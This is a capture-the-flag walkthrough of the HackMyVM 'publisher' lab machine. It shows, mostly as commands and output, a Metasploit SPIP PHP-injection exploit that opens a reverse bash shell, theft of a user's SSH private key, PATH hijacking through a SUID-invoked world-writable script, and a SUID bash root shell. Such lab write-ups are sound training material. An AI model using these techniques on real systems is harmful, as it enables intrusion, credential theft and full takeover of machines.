# publisher

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| publisher | josemlwdf | Beginner | HackMyVM |

**Summary:** The exploitation journey on the Publisher machine initiates with a network discovery phase, leading to the identification of an Apache web server running an outdated instance of the SPIP content management system. By confirming the version as 4.2.0, a known unauthenticated PHP injection vulnerability in the core form handling is leveraged to secure a reverse shell as the web service user. Subsequent enumeration of the filesystem uncovers a sensitive private SSH key within the home directory of a local user named think, facilitating lateral movement. The path to root involves bypassing a restrictive AppArmor profile that guards the directory named opt. This is achieved by exploiting a path hijacking flaw in a custom SUID binary that calls a world writable shell script. By overwriting this script to modify the permissions of the system bash binary, a persistent root shell is finally obtained.

---

## Walkthrough

### 1. Reconnaissance

The engagement begins with identifying the target host on the local network. A specialized scanning script is executed to locate the VirtualBox instance.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.199 08:00:27:81:48:86 VirtualBox
```

Following the discovery of the target IP 192.168.100.199, an Nmap scan is performed to enumerate all open ports and identify the services running on the system.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/publisher]
└─$ nmap -sCV -p- -T4 192.168.100.199
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-15 22:56 WIB
Nmap scan report for 192.168.100.199
Host is up (0.0023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.61 seconds
```

The scan reveals a web server on port 80. Navigating to this port using a web browser shows the application interface.

![alt text](image.png)

The application appears to be running SPIP. A directory enumeration is conducted to find hidden paths and confirm the presence of the CMS.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/publisher]
└─$ dirsearch -u http://192.168.100.199/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 220544

Output File: /tmp/publisher/reports/http_192.168.100.199/__26-05-15_23-08-00.txt

Target: http://192.168.100.199/

[23:08:00] Starting:
[23:08:00] 301 -  319B  - /images  ->  http://192.168.100.199/images/
[23:08:31] 301 -  317B  - /spip  ->  http://192.168.100.199/spip/
```

The exact version of the SPIP installation is verified by inspecting the meta generator tags in the source code.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/publisher]
└─$ curl -s "http://192.168.100.199/spip/" | grep "SPIP"
<meta name="generator" content="SPIP 4.2.0" /></head>
        <small class="generator"><a href="https://www.spip.net/" rel="generator" title="Site réalisé avec SPIP" class="generator spip_out"><svg class='SPIP' viewBox="0 -1 200 154" xmlns="http://www.w3.org/2000/svg" width="60" height="40" focusable='false' aria-hidden='true'>
```

### 2. Initial Access

SPIP version 4.2.0 is identified as vulnerable to an unauthenticated PHP injection. Metasploit is utilized to exploit this flaw and establish a reverse shell.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/publisher]
└─$ msfconsole -q
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/publisher]
└─$ msfconsole -q
msf > search spip 4.2

Matching Modules
================

   #   Name                                             Disclosure Date  Rank       Check  Description
   -   ----                                             ---------------  ----       -----  -----------
   0   exploit/multi/http/spip_bigup_unauth_rce         2024-09-06       excellent  Yes    SPIP BigUp Plugin Unauthenticated RCE
   1     \_ target: PHP In-Memory                       .                .          .      .
   2     \_ target: Unix/Linux Command Shell            .                .          .      .
   3     \_ target: Windows Command Shell               .                .          .      .
   4   exploit/multi/http/spip_porte_plume_previsu_rce  2024-08-16       excellent  Yes    SPIP Unauthenticated RCE via porte_plume Plugin
   5     \_ target: PHP In-Memory                       .                .          .      .
   6     \_ target: Unix/Linux Command Shell            .                .          .      .
   7     \_ target: Windows Command Shell               .                .          .      .
   8   exploit/multi/http/spip_rce_form                 2023-02-27       excellent  Yes    SPIP form PHP Injection
   9     \_ target: PHP In-Memory                       .                .          .      .
   10    \_ target: Unix/Linux Command Shell            .                .          .      .
   11    \_ target: Windows Command Shell               .                .          .      .


Interact with a module by name or index. For example info 11, use 11 or use exploit/multi/http/spip_rce_form
After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command Shell'

msf > use 8
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(multi/http/spip_rce_form) > set RHOSTS 192.168.100.199
RHOSTS => 192.168.100.199
msf exploit(multi/http/spip_rce_form) > set LHOST 192.168.100.1
LHOST => 192.168.100.1
msf exploit(multi/http/spip_rce_form) > set TARGETURI /spip
TARGETURI => /spip
msf exploit(multi/http/spip_rce_form) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   PHP In-Memory
    1   Unix/Linux Command Shell
    2   Windows Command Shell


msf exploit(multi/http/spip_rce_form) > set target 1
target => 1
msf exploit(multi/http/spip_rce_form) > set payload cmd/unix/reverse_bash
payload => cmd/unix/reverse_bash
msf exploit(multi/http/spip_rce_form) > exploit
[-] Handler failed to bind to 192.168.100.1:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] SPIP Version detected: 4.2.0
[+] The target appears to be vulnerable. The detected SPIP version (4.2.0) is vulnerable.
[*] Got anti-csrf token: AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
[*] 192.168.100.199:80 - Attempting to exploit...
[*] Command shell session 1 opened (172.20.131.21:4444 -> 172.20.128.1:57875) at 2026-05-15 23:29:51 +0700

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 3. Lateral Movement

Once the initial shell is achieved as the web service user, the system is surveyed for other users and potential credentials.

```bash
cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
think:x:1000:1000::/home/think:/bin/sh
ls -la /home
total 12
drwxr-xr-x 1 root  root  4096 Dec  7  2023 .
drwxr-xr-x 1 root  root  4096 Dec 20  2023 ..
drwxr-xr-x 8 think think 4096 Feb 10  2024 think
cd /home/think
ls -la
total 48
drwxr-xr-x 8 think    think    4096 Feb 10  2024 .
drwxr-xr-x 1 root     root     4096 Dec  7  2023 ..
lrwxrwxrwx 1 root     root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think    think     220 Nov 14  2023 .bash_logout
-rw-r--r-- 1 think    think    3771 Nov 14  2023 .bashrc
drwx------ 2 think    think    4096 Nov 14  2023 .cache
drwx------ 3 think    think    4096 Dec  8  2023 .config
drwx------ 3 think    think    4096 Feb 10  2024 .gnupg
drwxrwxr-x 3 think    think    4096 Jan 10  2024 .local
-rw-r--r-- 1 think    think     807 Nov 14  2023 .profile
lrwxrwxrwx 1 think    think       9 Feb 10  2024 .python_history -> /dev/null
drwxr-xr-x 2 think    think    4096 Jan 10  2024 .ssh
lrwxrwxrwx 1 think    think       9 Feb 10  2024 .viminfo -> /dev/null
drwxr-x--- 5 www-data www-data 4096 Dec 20  2023 spip
-rw-r--r-- 1 root     root       35 Feb 10  2024 user.txt
```

In the home directory of the user think, the SSH directory is found to be accessible. A private key is discovered which can be used for persistent access.

```bash
cd .ssh
ls -la
total 20
drwxr-xr-x 2 think think 4096 Jan 10  2024 .
drwxr-xr-x 8 think think 4096 Feb 10  2024 ..
-rw-r--r-- 1 root  root   569 Jan 10  2024 authorized_keys
-rw-r--r-- 1 think think 2602 Jan 10  2024 id_rsa
-rw-r--r-- 1 think think  569 Jan 10  2024 id_rsa.pub
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
...........[REDACTED]..............
-----END OPENSSH PRIVATE KEY-----
```

The recovered key is imported to the attacker machine, permissions are secured, and an SSH session is successfully established.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/publisher]
└─$ vim id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/publisher]
└─$ chmod 600 id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/publisher]
└─$ ssh think@192.168.100.199 -i id_rsa
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 15 May 2026 11:32:49 PM UTC

  System load:                      0.23
  Usage of /:                       74.7% of 9.75GB
  Memory usage:                     31%
  Swap usage:                       0%
  Processes:                        189
  Users logged in:                  0
  IPv4 address for br-72fdb218889f: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for enp0s3:          192.168.100.199


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Mar 29 13:22:11 2024 from 192.168.109.1
think@publisher:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

### 4. Privilege Escalation

With local access secured, a search for SUID binaries is conducted to find avenues for administrative escalation.

```bash
think@publisher:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 477672 Dec 18  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 14488 Dec 13  2023 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-- 1 root dip 395144 Jul 23  2020 /usr/sbin/pppd
-rwsr-sr-x 1 root root 16760 Nov 14  2023 /usr/sbin/run_container
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 88464 Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 85064 Nov 29  2022 /usr/bin/chfn
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 53040 Nov 29  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 68208 Nov 29  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root 55528 May 30  2023 /usr/bin/mount
-rwsr-xr-x 1 root root 67816 May 30  2023 /usr/bin/su
-rwsr-xr-x 1 root root 44784 Nov 29  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39144 May 30  2023 /usr/bin/umount
```

The binary /usr/sbin/run_container is identified as a custom SUID program. Strings analysis reveals that it invokes a shell script located at /opt/run_container.sh.

```bash
think@publisher:~$ which file strings
/usr/bin/file
/usr/bin/strings
think@publisher:~$ file /usr/sbin/run_container
/usr/sbin/run_container: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=de92d7f1ac0088bfa52908d5945bfb4fd8fd390e, for GNU/Linux 3.2.0, not stripped
think@publisher:~$ strings /usr/sbin/run_container
/lib64/ld-linux-x86-64.so.2
libc.so.6
__stack_chk_fail
execve
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
GLIBC_2.4
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
/bin/bash
/opt/run_container.sh
...
```

Direct access to the directory named opt is blocked by an AppArmor profile, yet the script itself is world writable.

```bash
think@publisher:~$ ls -la /opt
ls: cannot open directory '/opt': Permission denied
think@publisher:~$ ls -la /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Mar 29  2024 /opt/run_container.sh
```

The AppArmor configuration confirms that the ash shell is restricted from interacting with the opt directory.

```bash
think@publisher:~$ echo $0
-ash
think@publisher:~$ ls /etc/apparmor.d/
abi           force-complain  nvidia_modprobe  usr.bin.man        usr.sbin.mysqld
abstractions  local           sbin.dhclient    usr.sbin.ash       usr.sbin.rsyslogd
disable       lsb_release     tunables         usr.sbin.ippusbxd  usr.sbin.tcpdump
think@publisher:~$ cat /etc/apparmor.d/usr.sbin.ash
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** rwx,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rwix,
}
```

When the script is executed, it fails to find a command named validate_container_id. This indicates that the script relies on the system PATH to find this command, making it susceptible to path hijacking.

```bash
think@publisher:~$ /opt/run_container.sh
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied
docker: permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/create": dial unix /var/run/docker.sock: connect: permission denied.
See 'docker run --help'.
List of Docker containers:
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied

Enter the ID of the container or leave blank to create a new one: 1
/opt/run_container.sh: line 16: validate_container_id: command not found

OPTIONS:
1) Start Container    3) Restart Container  5) Quit
2) Stop Container     4) Create Container
Choose an action for a container: 5
Exiting...
```

By placing a malicious version of the missing command in a writable directory and modifying the PATH, a bash shell is spawned. From this shell, the world writable script is modified to set the SUID bit on bash, providing a reliable root entry point.

```bash
think@publisher:~$ echo '/bin/bash -i' > /tmp/validate_container_id
think@publisher:~$ chmod +x /tmp/validate_container_id
think@publisher:~$ export PATH=/tmp:$PATH
think@publisher:~$ /opt/run_container.sh
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied
docker: permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/create": dial unix /var/run/docker.sock: connect: permission denied.
See 'docker run --help'.
List of Docker containers:
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied

Enter the ID of the container or leave blank to create a new one: 1
think@publisher:~$ echo $0
/bin/bash
think@publisher:~$ echo 'chmod +s /bin/bash' > /opt/run_container.sh
think@publisher:~$ /usr/sbin/run_container
think@publisher:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

The final escalation is completed by executing the SUID bash binary, allowing for full control over the system and the retrieval of the flags.

```bash
think@publisher:~$ /bin/bash -p
bash-5.0# id
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
bash-5.0# python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
root@publisher:~# id
uid=0(root) gid=0(root) groups=0(root),1000(think)
root@publisher:~# su -
root@publisher:~$ id
uid=0(root) gid=0(root) groups=0(root)
root@publisher:~$ whoami
root
root@publisher:~$ hostname
publisher
root@publisher:~$ cat /home/think/user.txt
fa2[REDACTED]
root@publisher:~$ cat /root/root.txt
3a4[REDACTED]
```

---

## Attack Chain Summary
1. Reconnaissance: Scanning the network and performing detailed service enumeration.
2. Vulnerability Discovery: Identifying an outdated SPIP CMS version susceptible to unauthenticated PHP injection.
3. Exploitation: Gaining an initial shell by exploiting the vulnerable web form.
4. Internal Enumeration: Locating an SSH private key to pivot to the user account named think.
5. Privilege Escalation: Bypassing AppArmor via path hijacking and leveraging a world writable script invoked by a SUID binary to secure root access.

